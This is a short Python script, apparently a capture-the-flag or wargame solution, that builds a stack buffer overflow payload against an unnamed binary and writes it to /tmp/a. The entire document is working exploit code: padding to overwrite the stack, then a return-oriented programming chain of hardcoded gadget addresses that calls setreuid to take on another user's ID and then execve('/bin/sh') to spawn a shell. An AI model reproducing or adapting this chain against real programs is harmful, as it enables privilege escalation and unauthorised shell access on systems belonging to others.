    #!/usr/bin/env python
    # author: zombie
     
    from struct import *
 
    pld = ""
    pld += "A"*248 # the buffer
    pld += "B"*8 # len
    pld += "C"*8 # i
    pld += "D"*8
    pld += "E"*8
     
    pld += pack("<Q", 0x000000000044572b) # pop rax
    pld += pack("<Q", 113) # 113=setreuid
    pld += pack("<Q", 0x00000000004016d3) # pop rdi
    pld += pack("<Q", 1234)
    pld += pack("<Q", 0x00000000004017e7) # pop rsi
    pld += pack("<Q", 1234)
    pld += pack("<Q", 0x000000000045b525) # syscall
    pld += pack("<Q", 0x0000000000400493) # pop r12 ; ret
    pld += pack("<Q", 0x0000000000437229) # [r12] - pop,pop,ret
    pld += pack("<Q", 0x0000000000491be8) # mov rdi, rsp ; call r12
    pld += "/bin/sh\00"
    pld += pack("<Q", 0x0000000000437229) # pop rdx, pop rsi, ret
    pld += pack("<Q", 0x00) # rdx value
    pld += pack("<Q", 0x00) # rsi value
    pld += pack("<Q", 0x000000000044572b) # pop rax
    pld += pack("<Q", 59) # 59=execve
    pld += pack("<Q", 0x000000000045b525) # syscall
     
    f = open('/tmp/a', 'w')
    f.write(pld)
